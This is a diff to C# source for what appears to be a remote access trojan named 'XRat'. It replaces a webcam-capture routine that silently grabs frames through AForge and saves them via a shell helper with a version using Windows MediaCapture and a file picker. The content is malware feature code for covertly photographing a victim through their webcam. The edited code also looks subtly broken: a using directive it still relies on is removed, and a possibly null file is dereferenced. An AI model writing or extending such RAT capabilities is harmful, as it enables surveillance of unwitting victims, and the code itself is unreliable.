@@ -1,15 +1,16 @@
 ﻿using Microsoft.CSharp;
-using System;
 using System.CodeDom.Compiler;
 using System.Diagnostics;
 using System.Reflection;
 using System.Runtime.InteropServices;
-using System.Windows.Forms.Design;
+
 using HtmlAgilityPack;
-using System.Drawing;
-using AForge.Video;
-using AForge.Video.DirectShow;
-using System.IO;
+
+using Windows.Media.Capture;
+using Windows.Storage.Pickers;
+using Windows.Storage.Streams;
+using Windows.Storage;
+
 
 namespace XRat
 {
@@ -377,69 +378,38 @@ namespace XRat
             }
         }
 
-
-        // Asynchronous method to start the webcam capture
         public static async Task<string> WebCamAsync()
         {
-            // Получаем доступные устройства захвата видео (веб-камеры)
-            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+            // Запрашиваем доступ к камере
+            var mediaCapture = new MediaCapture();
+            await mediaCapture.InitializeAsync();
 
-            // Проверяем, есть ли устройства
-            if (videoDevices.Count == 0)
+            // Создаем пикер для выбора места сохранения
+            var picker = new FileSavePicker
             {
-                //throw new InvalidOperationException("Веб-камеры не обнаружены.");
+                SuggestedStartLocation = PickerLocationId.Downloads,
+                SuggestedFileName = "WebcamCapture_" + DateTime.Now.ToString("yyyyMMdd_HHmmss")
+            };
+            picker.FileTypeChoices.Add("JPEG Image", new[] { ".jpg" });
+
+            // Ожидаем выбора пути для сохранения файла
+            StorageFile file = await picker.PickSaveFileAsync();
+            if (file == null)
+            {
+                //throw new InvalidOperationException("Не был выбран путь для сохранения.");
             }
 
-            // Выбираем первую камеру по умолчанию (можно поменять на выбор другой камеры)
-            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+            // Делаем снимок с камеры
+            var photoStream = new InMemoryRandomAccessStream();
+            await mediaCapture.CapturePhotoToStreamAsync(Windows.Media.MediaProperties.ImageEncodingProperties.CreateJpeg(), photoStream);
 
-            // Подписываемся на событие получения кадра с камеры
-            videoSource.NewFrame += new NewFrameEventHandler(VideoSource_NewFrame);
+            // Сохраняем снимок в файл
+            var fileStream = await file.OpenStreamForWriteAsync();
+            photoStream.Seek(0);
+            await photoStream.AsStreamForRead().CopyToAsync(fileStream);
+            fileStream.Close();
 
-            // Попытка стартовать захват
-            try
-            {
-                videoSource.Start();
-                // Пример асинхронного ожидания (не блокирует основной поток)
-                await Task.Delay(5000);  // Задержка для захвата кадра (можно настроить)
-
-                // Останавливаем захват видео
-                videoSource.SignalToStop();
-                await Task.Run(() => videoSource.WaitForStop());  // Ожидаем остановки видео захвата асинхронно
-
-            }
-            catch (Exception ex)
-            {
-                //throw new InvalidOperationException("Ошибка при захвате видео: " + ex.Message);
-            }
-
-            return filePath;  // Возвращаем путь к файлу
-        }
-
-        // Метод, который вызывается при получении нового кадра с камеры
-        private static async void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
-        {
-            try
-            {
-                // Захватываем изображение
-                Bitmap bitmap = (Bitmap)eventArgs.Frame.Clone();
-
-                // Генерируем путь для сохранения снимка
-                string directory = ProCMD("cd").output;
-
-                // Сохраняем изображение в файл асинхронно
-                filePath = Path.Combine(directory, "WebcamCapture_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".jpg");
-
-                // Сохраняем изображение асинхронно
-                await Task.Run(() => bitmap.Save(filePath, System.Drawing.Imaging.ImageFormat.Jpeg));
-
-                // Освобождаем ресурсы
-                bitmap.Dispose();
-            }
-            catch (Exception ex)
-            {
-                //Console.WriteLine("Ошибка при обработке кадра: " + ex.Message);
-            }
+            return file.Path;  // Возвращаем путь к сохраненному файлу
         }
     }
 }
